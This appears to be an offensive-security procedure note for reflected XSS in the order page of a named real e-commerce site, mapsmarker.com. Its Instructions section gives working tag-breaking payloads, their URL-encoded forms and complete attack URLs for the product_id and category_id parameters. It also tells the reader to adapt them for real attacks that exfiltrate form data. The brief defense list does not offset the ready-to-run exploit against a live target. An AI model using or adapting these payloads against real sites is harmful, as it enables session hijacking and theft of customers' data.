---
tags:
  - xss
  - reflected-xss
  - parameter-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.393Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 092fc70f-7e3c-4a05-a10f-6e26666deeac
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# XSS-Injection-in-Store-Order-Product-Parameters

## Summary

This procedure exploits reflected XSS in the MapsMarker.com store order page by manipulating 'product_id' and 'category_id' parameters, allowing arbitrary JavaScript execution to potentially steal order data or hijack sessions.

## Description

The /store/order/index.php endpoint does not escape user input in URL parameters, enabling HTML attribute or tag injection when reflected into the page. This PHP-based vulnerability can lead to phishing attacks or data exfiltration during e-commerce interactions, affecting authenticated users.

## Requirements

1. Browser for URL construction and execution testing
2. Encoder for special characters in payloads
3. Access to the public order page

## Defense

Defensive measures and detection strategies:

- Validate and sanitize numeric parameters like product_id to integers only
- Use proper escaping for all dynamic content insertion
- Implement strict CSP headers
- Scan for injection patterns in access logs with tools like Fail2Ban

## Objectives

1. Inject and execute JS in the order context
2. Highlight e-commerce session risks
3. Validate for vulnerability disclosure

## Instructions

### Step 1: Load the Order Page

**Context**: Establish the base URL with default parameters.

Navigate to: https://www.mapsmarker.com/store/order/index.php/?task=product&product_id=1&category_id=1

Inspect for parameter reflection in HTML.

### Step 2: Inject Tag-Breaking Payload

**Context**: Break out of value attributes to insert script elements.

Payload: "><svg onLoad=prompt(9)>

Encoded: %22%3E%3Csvg%20onLoad%3Dprompt%289%29%3E

Full URL: https://www.mapsmarker.com/store/order/index.php/?task=product&product_id=1%22%3E%3Csvg%20onLoad%3Dprompt%289%29%3E&category_id=1

Visit the URL.

> Prompt appears on load. Adapt for real attacks, e.g., to exfiltrate form data.

### Step 3: Confirm and Iterate

**Context**: Check DOM and try variations for category_id.

Similar injection in category_id=1%22%3E%3Cscript%3Ealert(9)%3C/script%3E

**Expected Output**: JS execution confirmed via alert or console.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
